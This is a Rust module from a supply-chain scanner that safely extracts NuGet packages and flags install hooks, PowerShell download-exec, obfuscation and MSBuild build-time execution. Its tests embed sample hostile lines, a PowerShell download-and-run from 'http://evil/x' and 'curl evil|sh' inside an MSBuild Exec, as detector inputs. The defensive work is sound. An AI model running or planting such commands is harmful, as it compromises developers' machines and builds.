//! Extract a `.nupkg` (ZIP / Open Packaging Conventions) and scan it.
//!
//! `.nupkg` is a ZIP archive. There is no shared ZIP helper in
//! `argus-fetch` (its `extract_tarball` is gzip+tar only), so the
//! path-safe extraction loop here is copied from
//! `argus-pypi/src/wheel.rs`: reject path traversal, reject symlinks, and
//! cap total extracted size.
//!
//! After extraction we walk the tree and apply:
//! - ecosystem-agnostic content rules (`argus_rules::scan_text_file`),
//! - PowerShell install-hook rules on `*.ps1`,
//! - MSBuild build-time rules on `*.targets` / `*.props`,
//! - the single root-level `*.nuspec` manifest for name + version.

use crate::{finding, rules};
use anyhow::{anyhow, bail, Context, Result};
use argus_core::{Finding, Severity};
use argus_rules::{looks_binary, scan_text_file, TextFile};
use quick_xml::events::Event;
use quick_xml::reader::Reader;
use std::io::Read;
use std::path::{Component, Path};

const TEXT_MAX_BYTES: u64 = 1024 * 1024;

/// Result of scanning an extracted `.nupkg` tree.
pub struct NupkgScan {
    pub findings: Vec<Finding>,
    pub name: Option<String>,
    pub version: Option<String>,
}

/// Extract a `.nupkg` (ZIP) into `dest_root` and scan everything.
pub fn scan_nuget_archive(
    nupkg_bytes: &[u8],
    dest_root: &Path,
    max_extracted_bytes: u64,
) -> Result<NupkgScan> {
    extract_zip_safe(nupkg_bytes, dest_root, max_extracted_bytes)?;
    scan_extracted_nupkg(dest_root)
}

/// Path-safe ZIP extraction. Copied from `argus-pypi/src/wheel.rs` (there
/// is no shared ZIP helper in argus-fetch). Rejects traversal + symlinks
/// and caps total extracted bytes.
fn extract_zip_safe(nupkg_bytes: &[u8], dest_root: &Path, max_extracted_bytes: u64) -> Result<()> {
    let reader = std::io::Cursor::new(nupkg_bytes);
    let mut archive = zip::ZipArchive::new(reader).context("open .nupkg as ZIP")?;

    let mut total: u64 = 0;
    for i in 0..archive.len() {
        let mut file = archive
            .by_index(i)
            .with_context(|| format!("read .nupkg entry {i}"))?;

        let path = match file.enclosed_name() {
            Some(p) => p.to_owned(),
            None => {
                bail!(
                    ".nupkg entry {} has an unsafe path; refusing to extract",
                    file.name()
                );
            }
        };
        for comp in path.components() {
            match comp {
                Component::Normal(_) | Component::CurDir => {}
                Component::ParentDir => {
                    bail!(".nupkg entry `{}` traverses parent dir", path.display())
                }
                _ => bail!(
                    ".nupkg entry `{}` has unsafe path component",
                    path.display()
                ),
            }
        }

        if file.is_dir() {
            let dest = dest_root.join(&path);
            std::fs::create_dir_all(&dest).with_context(|| format!("mkdir {}", dest.display()))?;
            continue;
        }

        // External attributes can mark an entry as a symlink. We refuse.
        let mode = file.unix_mode().unwrap_or(0);
        // POSIX: S_IFLNK = 0o120000
        if (mode & 0o170000) == 0o120000 {
            bail!(
                "refusing to extract symlink .nupkg entry `{}`",
                path.display()
            );
        }

        let remaining = max_extracted_bytes
            .checked_sub(total)
            .ok_or_else(|| anyhow!(".nupkg size accounting overflow"))?;

        let dest = dest_root.join(&path);
        if let Some(parent) = dest.parent() {
            std::fs::create_dir_all(parent)
                .with_context(|| format!("mkdir parent {}", parent.display()))?;
        }
        let mut out =
            std::fs::File::create(&dest).with_context(|| format!("create {}", dest.display()))?;
        let mut limited = (&mut file).take(remaining + 1);
        let written = std::io::copy(&mut limited, &mut out)
            .with_context(|| format!("write {}", dest.display()))?;
        if written > remaining {
            bail!(
                ".nupkg extracted size exceeds cap {max_extracted_bytes} (entry {} overran)",
                path.display()
            );
        }
        total = total
            .checked_add(written)
            .ok_or_else(|| anyhow!(".nupkg size accounting overflow"))?;
    }
    Ok(())
}

/// Walk the extracted tree and apply all rules.
pub fn scan_extracted_nupkg(dest_root: &Path) -> Result<NupkgScan> {
    let mut findings: Vec<Finding> = Vec::new();
    let mut name: Option<String> = None;
    let mut version: Option<String> = None;
    let mut nuspec_seen = false;

    for entry in walkdir::WalkDir::new(dest_root).follow_links(false) {
        let entry = entry?;
        if !entry.file_type().is_file() {
            continue;
        }
        let abs = entry.path();
        let rel = abs
            .strip_prefix(dest_root)
            .unwrap_or(abs)
            .to_string_lossy()
            .replace('\\', "/");
        let lower_rel = rel.to_ascii_lowercase();
        let meta = entry.metadata()?;
        let oversized = meta.len() > TEXT_MAX_BYTES;

        // STEP 1 — PATH-based classification, BEFORE the size cap.
        //
        // The NuGet trigger surface (install-hook scripts, MSBuild
        // auto-import files, the root manifest) is identified by path, not
        // content. An attacker can pad any of these past `TEXT_MAX_BYTES`
        // to evade a size-gated scan, so we flag the install-hook by name
        // here regardless of size. This is the structural signal that an
        // install/build hook is present at all.
        let is_nuspec = !rel.contains('/') && lower_rel.ends_with(".nuspec");
        let is_ps1 = lower_rel.ends_with(".ps1");
        let is_msbuild = is_msbuild_autoimport(&lower_rel);
        if is_ps1 {
            // Path-only: a canonically-named install hook is flagged even
            // when its body is oversized (content rules below may be
            // unavailable, but its mere presence is the structural signal).
            scan_powershell_name(&rel, &mut findings);
        }

        // STEP 2 — read + decode the body. NuGet trigger files have their
        // content rules applied even when oversized (their set is bounded
        // and they are exactly the evasion target); generic files honor the
        // size cap so an arbitrarily large blob is not loaded into memory.
        let is_trigger = is_nuspec || is_ps1 || is_msbuild;
        if oversized && !is_trigger {
            continue;
        }
        let bytes = match std::fs::read(abs) {
            Ok(b) => b,
            Err(_) => continue,
        };
        if looks_binary(&bytes) {
            continue;
        }
        let content = String::from_utf8_lossy(&bytes).into_owned();

        // The single root-level `*.nuspec` is the manifest.
        if is_nuspec {
            nuspec_seen = true;
            if let Some((n, v)) = parse_nuspec_name_version(&content) {
                name = name.or(n);
                version = version.or(v);
            }
            scan_nuspec_structure(&content, &rel, &mut findings);
            continue;
        }

        // Ecosystem-agnostic content rules. Generic files only reach here
        // when within the size cap; trigger files reach here regardless.
        if !oversized {
            scan_text_file(
                &TextFile {
                    rel: rel.clone(),
                    content: content.clone(),
                },
                &mut findings,
            );
        }

        // PowerShell install/uninstall content rules (download-exec, obfuscation).
        if is_ps1 {
            scan_powershell_content(&content, &rel, &mut findings);
        }

        // MSBuild build-time content rules.
        if is_msbuild {
            scan_msbuild(&content, &rel, &mut findings);
        }
    }

    if !nuspec_seen {
        findings.push(finding(
            "nuget-no-manifest",
            Severity::Info,
            "no root-level `.nuspec` manifest found in .nupkg".to_string(),
        ));
    }

    Ok(NupkgScan {
        findings,
        name,
        version,
    })
}

/// Returns true when a (lowercased) relative path is an MSBuild file that
/// NuGet auto-imports into the consumer build. NuGet auto-imports
/// `.targets`/`.props` from `build/`, `buildTransitive/`, AND
/// `buildMultiTargeting/` (the latter is imported when the consuming project
/// multi-targets several TFMs).
fn is_msbuild_autoimport(lower_rel: &str) -> bool {
    (lower_rel.ends_with(".targets") || lower_rel.ends_with(".props"))
        && (lower_rel.starts_with("build/")
            || lower_rel.starts_with("buildtransitive/")
            || lower_rel.starts_with("buildmultitargeting/"))
}

/// Flag install-hook scripts by canonical name. Path-only: runs before the
/// size cap so a padded `tools/install.ps1` is still surfaced.
fn scan_powershell_name(rel: &str, findings: &mut Vec<Finding>) {
    let lower = rel.to_ascii_lowercase();
    let base = lower.rsplit('/').next().unwrap_or(&lower);
    if matches!(base, "init.ps1" | "install.ps1" | "uninstall.ps1") {
        findings.push(finding(
            "nuget-install-script",
            Severity::High,
            format!("`{rel}` is a NuGet install/uninstall PowerShell hook that runs in the Package Manager Console"),
        ));
    }
}

/// Detect dangerous PowerShell content (download-exec, obfuscation).
fn scan_powershell_content(content: &str, rel: &str, findings: &mut Vec<Finding>) {
    if rules::powershell_download_exec_regex().is_match(content) {
        findings.push(finding(
            "powershell-download-exec",
            Severity::Critical,
            format!("`{rel}` downloads and/or executes code from PowerShell"),
        ));
    }
    if rules::powershell_obfuscation_regex().is_match(content) {
        findings.push(finding(
            "powershell-obfuscation",
            Severity::High,
            format!("`{rel}` contains base64/encoded-command obfuscation markers"),
        ));
    }
}

/// Detect build-time arbitrary execution inside MSBuild integration files.
fn scan_msbuild(content: &str, rel: &str, findings: &mut Vec<Finding>) {
    if rules::msbuild_exec_task_regex().is_match(content) {
        findings.push(finding(
            "msbuild-exec-task",
            Severity::High,
            format!("`{rel}` runs a command/download/inline task on every consumer `dotnet build`"),
        ));
    }
    if rules::msbuild_inline_task_regex().is_match(content) {
        findings.push(finding(
            "msbuild-inline-task",
            Severity::High,
            format!("`{rel}` declares a `<UsingTask AssemblyFile=...>` — build-time code from a packaged assembly"),
        ));
    }
}

/// Structural nuspec signals: `<contentFiles>` / `<files>` mappings that
/// auto-include into the consumer project. Info-only (structural).
fn scan_nuspec_structure(content: &str, rel: &str, findings: &mut Vec<Finding>) {
    let lower = content.to_ascii_lowercase();
    if lower.contains("<contentfiles") || lower.contains("<files") {
        findings.push(finding(
            "nuget-content-files",
            Severity::Info,
            format!("`{rel}` declares contentFiles/files that map into the consumer project"),
        ));
    }
}

/// Pull `<metadata><id>` and `<metadata><version>` out of a `.nuspec`,
/// ignoring the default XML namespace. Returns best-effort (Option, Option).
fn parse_nuspec_name_version(xml: &str) -> Option<(Option<String>, Option<String>)> {
    let mut reader = Reader::from_str(xml);
    reader.config_mut().trim_text(true);

    let mut in_metadata = false;
    let mut current: Option<String> = None;
    let mut name: Option<String> = None;
    let mut version: Option<String> = None;
    let mut buf = Vec::new();

    loop {
        match reader.read_event_into(&mut buf) {
            Ok(Event::Start(e)) => {
                let local = local_name(e.name().as_ref());
                if local == "metadata" {
                    in_metadata = true;
                } else if in_metadata && (local == "id" || local == "version") {
                    current = Some(local);
                }
            }
            Ok(Event::Text(t)) => {
                if let Some(field) = current.as_deref() {
                    let text = t.xml_content().ok()?.trim().to_string();
                    if !text.is_empty() {
                        match field {
                            "id" => name = name.or(Some(text)),
                            "version" => version = version.or(Some(text)),
                            _ => {}
                        }
                    }
                }
            }
            Ok(Event::End(e)) => {
                let local = local_name(e.name().as_ref());
                if local == "metadata" {
                    in_metadata = false;
                }
                if Some(local.as_str()) == current.as_deref() {
                    current = None;
                }
            }
            Ok(Event::Eof) => break,
            Err(_) => return None,
            _ => {}
        }
        buf.clear();
    }

    if name.is_none() && version.is_none() {
        return None;
    }
    Some((name, version))
}

/// Strip any `prefix:` from an XML element's qualified name, returning the
/// lowercased local name. NuGet nuspec uses a default namespace, so we
/// match on local names.
fn local_name(qname: &[u8]) -> String {
    let s = String::from_utf8_lossy(qname);
    let local = s.rsplit(':').next().unwrap_or(&s);
    local.to_ascii_lowercase()
}

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn parse_nuspec_basic() {
        let xml = r#"<?xml version="1.0"?>
<package xmlns="http://schemas.microsoft.com/packaging/2010/07/nuspec.xsd">
  <metadata>
    <id>Demo.Package</id>
    <version>1.2.3</version>
    <authors>someone</authors>
  </metadata>
</package>"#;
        let (n, v) = parse_nuspec_name_version(xml).unwrap();
        assert_eq!(n.as_deref(), Some("Demo.Package"));
        assert_eq!(v.as_deref(), Some("1.2.3"));
    }

    #[test]
    fn parse_nuspec_with_prefix() {
        let xml = r#"<nu:package xmlns:nu="x"><nu:metadata><nu:id>Foo</nu:id><nu:version>9.9</nu:version></nu:metadata></nu:package>"#;
        let (n, v) = parse_nuspec_name_version(xml).unwrap();
        assert_eq!(n.as_deref(), Some("Foo"));
        assert_eq!(v.as_deref(), Some("9.9"));
    }

    #[test]
    fn parse_nuspec_garbage_returns_none() {
        assert!(parse_nuspec_name_version("not xml at all <<<").is_none());
    }

    #[test]
    fn powershell_install_hook_flagged() {
        let mut f = Vec::new();
        scan_powershell_name("tools/install.ps1", &mut f);
        assert!(f.iter().any(|x| x.rule_id == "nuget-install-script"));
    }

    #[test]
    fn powershell_download_exec_flagged() {
        let mut f = Vec::new();
        scan_powershell_name("tools/install.ps1", &mut f);
        scan_powershell_content(
            "Invoke-WebRequest http://evil/x -OutFile p.exe; Start-Process p.exe",
            "tools/install.ps1",
            &mut f,
        );
        assert!(f.iter().any(|x| x.rule_id == "powershell-download-exec"));
        assert!(f.iter().any(|x| x.rule_id == "nuget-install-script"));
    }

    #[test]
    fn is_msbuild_autoimport_covers_buildmultitargeting() {
        assert!(is_msbuild_autoimport("buildmultitargeting/foo.targets"));
        assert!(is_msbuild_autoimport("buildmultitargeting/foo.props"));
        assert!(is_msbuild_autoimport("build/foo.targets"));
        assert!(is_msbuild_autoimport("buildtransitive/foo.props"));
        // Not auto-imported: arbitrary directory, or wrong extension.
        assert!(!is_msbuild_autoimport("content/foo.targets"));
        assert!(!is_msbuild_autoimport("buildmultitargeting/foo.txt"));
    }

    #[test]
    fn msbuild_exec_flagged() {
        let mut f = Vec::new();
        scan_msbuild(
            r#"<Project><Target><Exec Command="curl evil|sh"/></Target></Project>"#,
            "build/Foo.targets",
            &mut f,
        );
        assert!(f.iter().any(|x| x.rule_id == "msbuild-exec-task"));
    }

    #[test]
    fn msbuild_benign_not_flagged() {
        let mut f = Vec::new();
        scan_msbuild(
            r#"<Project><ItemGroup><Reference Include="System"/></ItemGroup></Project>"#,
            "build/Foo.props",
            &mut f,
        );
        assert!(f.is_empty());
    }
}
